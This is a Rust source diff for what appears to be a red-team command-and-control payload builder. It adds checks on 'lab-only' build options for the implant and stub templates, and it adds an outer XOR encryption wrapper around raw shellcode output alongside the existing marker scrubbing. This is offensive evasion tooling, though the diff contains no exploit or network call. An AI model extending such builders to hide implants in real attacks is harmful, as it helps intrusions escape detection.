@@ -8,7 +8,7 @@ pub use config_gen::{
     generate_config_with_evasion_magic_and_layout,
     generate_config_with_evasion_magic_layout_and_module_key, generate_config_with_magic,
     ChannelConfig, EvasionFlags, GeneratedConfig, PicLayoutMetadata, SleepConfig,
-    DEFAULT_CONFIG_MAGIC,
+    CONFIG_DECRYPT_MAX_BUDGET, DEFAULT_CONFIG_MAGIC,
 };
 pub use formats::{
     format_dll, format_dotnet, format_hta_stager, format_ps1_stager, format_raw,
@@ -100,6 +100,13 @@ pub struct TemplateBlob {
 pub struct BuilderConfig {
     /// Directory containing pre-compiled template blobs.
     pub template_dir: PathBuf,
+}
+
+/// Lab-only build intents. These are validation gates over already-built
+/// templates; they do not mutate compiled implant or stub behavior.
+#[derive(Debug, Clone, Copy, Default)]
+pub struct LabBuildOptions {
+    pub callback_tick_detached_holder: bool,
 }
 
 /// Result of a payload build.
@@ -200,6 +207,13 @@ pub struct PayloadBuilder {
     module_signing_key: Option<[u8; 32]>,
 }
 
+fn read_template_feature(path: &Path, key: &str) -> bool {
+    let Ok(text) = std::fs::read_to_string(path) else {
+        return false;
+    };
+    text.lines().any(|line| line.trim() == format!("{key}=1"))
+}
+
 impl PayloadBuilder {
     /// Initialize the payload builder with the given config.
     ///
@@ -219,6 +233,39 @@ impl PayloadBuilder {
     pub fn with_module_signing_key(mut self, key: [u8; 32]) -> Self {
         self.module_signing_key = Some(key);
         self
+    }
+
+    pub fn validate_lab_options(
+        &self,
+        format: OutputFormat,
+        lab: LabBuildOptions,
+    ) -> Result<(), BuilderError> {
+        if !lab.callback_tick_detached_holder {
+            return Ok(());
+        }
+        if format == OutputFormat::RawShellcode {
+            return Err(BuilderError::Config(
+                "lab callback_tick_detached_holder requires a PE template format".into(),
+            ));
+        }
+
+        let pic_features = self.template_dir.join("specter.features");
+        if !read_template_feature(&pic_features, "callback_tick") {
+            return Err(BuilderError::Config(format!(
+                "lab callback_tick_detached_holder requested, but {} does not contain callback_tick=1; rebuild implant with CALLBACK_TICK=1",
+                pic_features.display()
+            )));
+        }
+
+        let stub_features = self.template_dir.join("stub.features");
+        if !read_template_feature(&stub_features, "detached_hold") {
+            return Err(BuilderError::Config(format!(
+                "lab callback_tick_detached_holder requested, but {} does not contain detached_hold=1; rebuild stubs with DETACHED_HOLD=1",
+                stub_features.display()
+            )));
+        }
+
+        Ok(())
     }
 
     /// Verify toolchain availability and load template blobs from disk.
@@ -436,6 +483,15 @@ impl PayloadBuilder {
         // Phase B: Scrub all remaining SPEC* markers from the final payload.
         // Config magic and build flags are no longer patched by fixed markers.
         obfuscation::finalize_payload(&mut payload);
+
+        if obfuscation_settings.xor_encryption {
+            if format != OutputFormat::RawShellcode {
+                return Err(BuilderError::Config(
+                    "outer XOR wrapper is only supported for raw shellcode output".to_string(),
+                ));
+            }
+            payload = obfuscation::xor_encrypt_blob(&payload, &mut rand::thread_rng());
+        }
 
         Ok(BuildResult {
             payload,
